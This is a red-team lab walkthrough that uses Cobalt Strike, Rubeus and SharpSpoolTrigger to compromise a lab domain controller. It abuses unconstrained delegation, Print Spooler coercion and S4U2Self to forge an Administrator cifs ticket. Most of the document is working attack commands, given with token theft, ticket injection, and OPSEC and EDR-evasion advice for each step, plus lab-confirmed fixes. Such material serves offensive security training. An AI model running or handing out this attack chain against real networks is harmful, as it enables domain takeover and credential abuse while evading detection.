# S4U2Self Lab  

>The objective for this lab is to demonstrate how to abuse S4U2self with the TGT for a computer account.

**Concept:** S4U2Self allows a service to request a service ticket to *itself* on behalf of any user — no user TGT or password needed. Combined with unconstrained delegation and a coercion trigger `SpoolSample`, you capture the DC machine account TGT, then use `krb_s4u /self` to generate a usable `cifs` service ticket impersonating a Domain Admin. The DC machine account TGT alone cannot be used for file access — S4U2Self bridges that gap.

===

## Enumeration

1. Launch Cobalt Strike and connect to the team server.
2. Find computers configured with unconstrained delegation (excludes DCs — not a viable attack path):

    ```Beacon-nocolor
    ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName
    ```

    > OPSEC-🟢SAFE — BOF, runs in beacon thread, no child process.

⚠️ Expected result: `lon-ws-1$` — the unconstrained delegation host you will pivot through.

3. Impersonate the *rsteel* user and move laterally to `lon-ws-1`.

===

## Lateral Movement to lon-ws-1

Goal: get a beacon on `lon-ws-1`. SYSTEM is **not** strictly required for this lab — Rubeus monitor runs via execute-assembly. However, winrm64 lands as `rsteel` (not SYSTEM), so `getsystem` is needed before running Rubeus monitor, followed by `rev2self` (see Step 1 note below).

### Option A — steal_token (preferred, OPSEC-🟢SAFE)

1. On the existing beacon, run `ps` or `process_browser` and find a process owned by `rsteel`:

    ```Beacon-nocolor
    ps
    ```

    Look for `cmd.exe` or `mmc.exe` owned by `CONTOSO\rsteel`.

2. Steal the token:

    ```Beacon-nocolor
    steal_token <rsteel-pid>
    ```

    > OPSEC-🟢SAFE — token duplication in beacon thread, no logon event, no child process.

3. Set spawnto before jumping:

    ```Beacon-nocolor
    ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
    ```

    > OPSEC-🟠CAUTION — sets the sacrificial process for fork & run. `dllhost.exe` blends with COM surrogate activity.

4. Jump to lon-ws-1:

    ```Beacon-nocolor
    jump winrm64 lon-ws-1 smb_custom
    ```

    > OPSEC-🟢SAFE — WinRM, no service modification, no disk write, no Event 7045.

5. Drop token on source beacon after jump succeeds:

    ```Beacon-nocolor
    rev2self
    ```

### Option B — make_token + kerberos_ticket_use (when no rsteel process visible)

1. Dump rsteel's TGT from the cached session:

    ```Beacon-nocolor
    krb_triage
    krb_dump /user:rsteel /service:krbtgt
    ```

    > OPSEC-🟠CAUTION — Kerberos API call via `LsaCallAuthenticationPackage`. No raw LSASS read.

2. Write the base64 TGT to a `.kirbi` file on the **attacker desktop** (local PowerShell — not via beacon):

    ```powershell
    [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[BASE64-TGT]"))
    ```

    > ⚠️ Lab-confirmed (2026-04-19): `kerberos_ticket_use` requires a **file path** — pasting base64 directly fails with `does not exist` error.

3. Create a fake logon session and inject the TGT:

    ```Beacon-nocolor
    make_token CONTOSO\rsteel FakePass
    kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
    ```

    > OPSEC-🟠CAUTION — `make_token` generates Event 4648.

4. Jump to lon-ws-1:

    ```Beacon-nocolor
    jump winrm64 lon-ws-1 smb_custom
    ```

5. Drop token and purge on source beacon:

    ```Beacon-nocolor
    rev2self
    kerberos_ticket_purge
    ```

### On the new lon-ws-1 beacon

```Beacon-nocolor
getuid
```

> ⚠️ Lab-confirmed (2026-04-19): `jump winrm64` lands as `CONTOSO\rsteel` (not SYSTEM) — WinRM injects into `wsmprovhost.exe` running as the authenticated user. SYSTEM context is needed before running Rubeus monitor. Use `getsystem`:

```Beacon-nocolor
getsystem
getuid    # confirm NT AUTHORITY\SYSTEM
```

> OPSEC-🟠CAUTION — getsystem uses named pipe impersonation from admin context.

===

## Exploitation

### Step 1 — Start Rubeus monitor on lon-ws-1

Monitors for incoming TGTs via SSPI as they arrive — no LSASS memory read.

> ⚠️ Lab-confirmed (2026-04-19): `execute-assembly` **fails with "No .NET runtime found"** immediately after `getsystem`. The getsystem impersonation token breaks the fork-and-run .NET host. Fix: `rev2self` first, then run Rubeus monitor:

```Beacon-nocolor
rev2self
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap
```

> OPSEC-🟠CAUTION — fork & run into `dllhost.exe` (spawnto set above). Ticket capture itself uses Windows SSPI/Kerberos API — no direct LSASS read. `/targetuser` filters output to the DC machine account only, reducing noise.

> ⚠️ After rev2self you will be back to `rsteel` context — that is fine. Rubeus monitor runs in the sacrificial process and captures tickets regardless of the beacon's impersonation state.

---

### Step 2 — Coerce lon-dc-1 to authenticate to lon-ws-1

Triggers the Print Spooler service on `lon-dc-1` via MS-RPRN to send its TGT to `lon-ws-1`.

```Beacon-nocolor
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
```

> OPSEC-🟠CAUTION — fork & run. Generates a 4648 logon event on `lon-dc-1` and MS-RPRN RPC traffic. Print Spooler must be running on the DC.

> ⚠️ Lab-confirmed (2026-04-19): SharpSpoolTrigger may return `[-]RpcRemoteFindFirstPrinterChangeNotificationEx status: 6` (ERROR_INVALID_HANDLE) on both attempts. Despite this error, Rubeus monitor **still captured the DC TGT** — the unconstrained delegation host receives the TGT from any prior DC authentication, not only from the coercion trigger. If Rubeus monitor shows a TGT for `lon-dc-1$`, proceed regardless of SpoolTrigger error.

⚠️ Rubeus monitor output should capture the TGT of `LON-DC-1$`. Copy the full base64 ticket string — paste it **directly into the `krb_s4u` command** below. No file write needed at this stage.

---

### Step 3 — S4U2Self to obtain a usable cifs service ticket

The DC machine account TGT cannot be used directly for file access. Use `krb_s4u /self` to convert it into a `cifs` service ticket impersonating Administrator.

```Beacon-nocolor
krb_s4u /ticket:[paste-base64-DC-TGT-here] /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator
```

> OPSEC-🟢SAFE — `krb_s4u` is a BOF. Runs in beacon thread, no child process, no disk write.

> ⚠️ Lab-confirmed (2026-04-19): This command succeeded. Output confirms:
> - `[*] Building S4U2self request for: 'LON-DC-1$@CONTOSO.COM'`
> - `[+] S4U2self success!`
> - `[*] Substituting alternative service name 'cifs/lon-dc-1'`
> - `[*] Got a TGS for 'Administrator' to 'cifs@CONTOSO.COM'`

⚠️ `krb_s4u` outputs a **new** base64-encoded service ticket (this is a different ticket to the DC TGT). Copy this new base64 string — this one gets written to the `.kirbi` file in Step 4.

```
Rubeus monitor output  →  base64 DC TGT       →  paste into krb_s4u
krb_s4u output         →  base64 cifs ticket  →  WriteAllBytes → .kirbi → kerberos_ticket_use
```

---

### Step 4 — Save the service ticket on the attacker machine

Run this on the attacker CS client (local PowerShell — **not** via beacon):

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi", [Convert]::FromBase64String("[BASE64-SERVICE-TICKET]"))
```

> The `.kirbi` file is written to your **attacker desktop only** — nothing touches the target's disk. `kerberos_ticket_use` reads from the CS client and injects over the C2 channel.

> ⚠️ Lab-confirmed (2026-04-19): `kerberos_ticket_use` requires a **file path** — attempting to pass the raw base64 string directly fails with error `'C:\Tools\cobaltstrike\client\[base64...]' does not exist`. Always write the `.kirbi` file first, then reference the file path.

---

### Step 5 — Inject the ticket and access the share

Back in the beacon on **`lon-ws-1`** (not lon-dc-1 — you are accessing it remotely via the ticket):

```Beacon-nocolor
// Option A — skip make_token (OPSEC-🟢SAFE — no Event 4648, preferred)
kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi
ls \\lon-dc-1\c$

// Option B — with make_token (OPSEC-🟠CAUTION — Event 4648, cleaner session)
make_token CONTOSO\Administrator FakePass
kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi
ls \\lon-dc-1\c$
```

> OPSEC-🟢SAFE — `kerberos_ticket_use` injects the ticket into the current logon session. `make_token` is optional — the remote server validates the Kerberos ticket content, not the local session identity.

⚠️ `ls \\lon-dc-1\c$` should succeed. If it fails with `ACCESS_DENIED`, verify:
- `getuid` — confirm token is set
- `run klist` — confirm the `cifs/lon-dc-1` ticket is present in the session (note: `run klist` spawns a child process — acceptable for quick verification only)
- The SPN in `krb_s4u` exactly matches `cifs/lon-dc-1`

Drop impersonation and purge ticket when done:

```Beacon-nocolor
rev2self
kerberos_ticket_purge
```

===

⚠️ In this lab, you have learned how to combine unconstrained delegation, remote authentication triggers, and S4U2Self to compromise domain controller `lon-dc-1` — converting an unusable DC machine account TGT into a valid `cifs` service ticket without touching LSASS directly.

===

## Lab Observations (2026-04-19)

| Finding | Detail |
|---------|--------|
| `kerberos_ticket_use` rejects raw base64 | Passing base64 directly fails: CS treats the string as a file path and errors with `does not exist`. Must write `.kirbi` file first. |
| `getsystem` breaks `execute-assembly` | After `getsystem`, Rubeus monitor fails: `No .NET runtime found`. Run `rev2self` before `execute-assembly`. The monitor job runs fine in rsteel admin context. |
| `jump winrm64` lands as rsteel | WinRM injects into `wsmprovhost.exe` as the authenticated user — not SYSTEM. `getsystem` needed for SYSTEM context, but `rev2self` required before Rubeus. |
| SharpSpoolTrigger `status: 6` | `RpcRemoteFindFirstPrinterChangeNotificationEx status: 6` = ERROR_INVALID_HANDLE. Both coercion attempts returned this error. Rubeus monitor still captured the DC TGT from a prior natural authentication — the unconstrained host had the TGT cached already. |
| `smb_custom` listener worked first attempt | No retry required with custom pipe name (vs TSVCPIPE-* default). |
| `krb_s4u /self` succeeded | LON-DC-1$ TGT → `cifs/lon-dc-1` service ticket for Administrator. Confirmed S4U2self flow end-to-end. |
| EDR on lon-ws-1 | Elastic Endpoint, MsMpEng, Sysmon64 present — spawnto override and custom SMB pipe required. |
